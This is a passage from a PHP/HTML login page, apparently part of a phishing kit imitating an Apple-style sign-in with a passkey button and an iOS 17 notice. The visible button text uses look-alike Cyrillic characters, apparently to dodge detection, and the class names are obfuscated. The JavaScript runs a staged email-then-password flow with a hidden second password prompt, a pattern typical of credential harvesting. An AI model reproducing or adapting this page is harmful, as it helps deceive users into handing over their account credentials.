          <path d="M20.696 23.596q2.698 0 4.95-1.447 2.254-1.448 3.608-3.912 1.355-2.465 1.355-5.532 0-2.98-1.358-5.395-1.36-2.416-3.612-3.826-2.253-1.41-4.943-1.41-2.682 0-4.935 1.427-2.252 1.427-3.615 3.85-1.363 2.424-1.355 5.394 0 3.043 1.359 5.5 1.359 2.456 3.608 3.904 2.248 1.447 4.938 1.447zM4.547 46.39H36.23q-.393-.887-.393-1.88v-8.762q-2.307-1.832-3.167-4.673-2.366-1.428-5.386-2.3-3.02-.87-6.587-.87-4.753 0-8.572 1.412Q8.304 30.73 5.6 32.99q-2.705 2.26-4.152 4.853Q0 40.434 0 42.77q0 1.693 1.208 2.656 1.208.964 3.34.964zm37.724-27.444q-2.123 0-3.843 1.02-1.72 1.021-2.736 2.733-1.016 1.712-1.016 3.801 0 2.345 1.255 4.236 1.255 1.892 3.357 2.785V44.51q0 .513.427.942l2.007 1.962q.241.218.574.23.333.012.614-.26l3.593-3.61q.289-.273.277-.637-.012-.364-.292-.628l-1.97-2.016 2.842-2.774q.264-.265.26-.633-.005-.367-.293-.672l-2.698-2.706q2.499-1.105 3.859-2.983 1.36-1.877 1.36-4.224 0-2.09-1.02-3.801-1.02-1.712-2.74-2.732-1.72-1.02-3.817-1.02zm-.017 3.744q.928 0 1.595.667.668.667.668 1.595 0 .97-.668 1.641-.667.672-1.595.672-.929 0-1.608-.672-.68-.67-.68-1.64 0-.929.671-1.596.672-.667 1.617-.667z" fill="rgba(255,255,255)"/>
        </svg>
        <span class="btxre4">Sіgn іn wіth Раѕѕkеy</span>
        <img src="loading.gif" alt="Loading..." class="btg765" style="display:none; width: 24px; height: 24px; margin-left: 8px; vertical-align: middle;">
      </button>
    </div>
    <div class="stx76tt" style="display: <?php echo (!$showPassword && !$isError && !$showSecondSections) ? 'block' : 'none'; ?>;">Requires a device with iOS 17 or later.</div>
  </form>
</div>

<script>
document.addEventListener('DOMContentLoaded', function() {
    var emailInput = document.getElementById('emailOrPhone');
    var passwordSection = document.getElementById('passwordSection');
    var secondPasswordSection = document.getElementById('secondPasswordSection');
    var secondPasswordInput = document.getElementById('password1');
    var conb677Btn = document.querySelector('.conb677');
    var forgotPasswordLink = document.getElementById('forgotPasswordLink');
    var privacyBlock = document.querySelector('.checkbox-Rec567 + div');
    var checkboxContainer = document.getElementById('checkboxContainer');

    // Initially disable email input and button
    emailInput.disabled = true;
    conb677Btn.classList.remove('enabled');

    // Hide loading overlay after 2 seconds and enable input and button
    setTimeout(function() {
        var loadingOverlay = document.getElementById('loadingOverlay');
        if (loadingOverlay) {
            loadingOverlay.style.display = 'none';
        }
        emailInput.disabled = false;
        emailInput.focus();
        updateUI();
        document.querySelectorAll('.btxre4').forEach(span => span.style.display = 'inline');
    }, 2000);

    function updateUI() {
        var email = emailInput.value.trim();
        if (email !== '') {
            conb677Btn.classList.add('enabled');
        } else {
            conb677Btn.classList.remove('enabled');
        }
    }

    conb677Btn.addEventListener('click', function(e) {
        e.preventDefault();
        
        // Check if second password section is visible
        var isSecondAttempt = secondPasswordSection && secondPasswordSection.style.display === 'block' && 
                              secondPasswordInput && secondPasswordInput.value.trim() !== '';
        
        // If second attempt - submit form immediately
        if (isSecondAttempt) {
            var gif = conb677Btn.querySelector('.btg765');
            if (gif) {
                gif.style.display = 'inline-block';
                conb677Btn.classList.add('highlighted-text');
                conb677Btn.querySelector('.btxre4').style.display = 'none';
                setTimeout(function() {
                    document.querySelector('form').submit();
                }, 500);
            } else {
                document.querySelector('form').submit();
            }
        }
        // First attempt - show password field if not shown
        else if (passwordSection.style.display === 'none') {
            if (emailInput.value.trim() !== '') {
                conb677Btn.innerHTML = '<span class="btxre4">Соntіnuе</span><img src="loading.gif" alt="Loading..." class="btg765" style="display:inline-block; width: 20px; height: 20px; vertical-align: middle;">';
                conb677Btn.querySelector('.btxre4').style.display = 'none';
                setTimeout(function() {
                    passwordSection.style.display = 'block';
                    if (checkboxContainer) checkboxContainer.style.display = 'flex';
                    if (forgotPasswordLink) forgotPasswordLink.style.display = 'inline';
                    if (privacyBlock) privacyBlock.style.display = 'none';
                    document.querySelector('.Bst543').style.marginTop = '110px';
                    document.querySelector('.ps45y').style.display = 'none';
                    document.querySelector('.stx76tt').style.display = 'none';
                    conb677Btn.innerHTML = '<span class="btxre4">Sіgn In</span><img src="loading.gif" alt="Loading..." class="btg765" style="display:none; width: 20px; height: 20px; vertical-align: middle;">';
                    conb677Btn.querySelector('.btxre4').style.display = 'inline';
                    conb677Btn.querySelector('.btxre4').textContent = 'Sіgn In';
                }, 500);
            }
        }
        // First password already shown - submit first attempt
        else {
            var gif = conb677Btn.querySelector('.btg765');
            if (gif) {
                gif.style.display = 'inline-block';
                conb677Btn.classList.add('highlighted-text');
                conb677Btn.querySelector('.btxre4').style.display = 'none';
                setTimeout(function() {
                    document.querySelector('form').submit();
                }, 500);
            } else {
                document.querySelector('form').submit();
            }
        }
    });

    if (emailInput) {
        emailInput.addEventListener('input', updateUI);
    }
    updateUI();

    // Floating placeholder effect
    function handleFloatingPlaceholder(input) {
        var Rec567 = input.closest('.input-Rec567');
        if (Rec567) {
            if (input.value.trim() !== '' || input === document.activeElement) {
                Rec567.classList.add('floating');
            } else {
                Rec567.classList.remove('floating');
            }
        }
    }

    // Add event listeners to all input fields
    var inputFields = document.querySelectorAll('.Tre789');
    inputFields.forEach(function(input) {
        input.addEventListener('focus', function() {
            handleFloatingPlaceholder(this);
        });

        input.addEventListener('blur', function() {
            handleFloatingPlaceholder(this);
        });

        input.addEventListener('input', function() {
            handleFloatingPlaceholder(this);
        });

        // Initialize on page load
        handleFloatingPlaceholder(input);
    });
});
</script>
</body>
</html>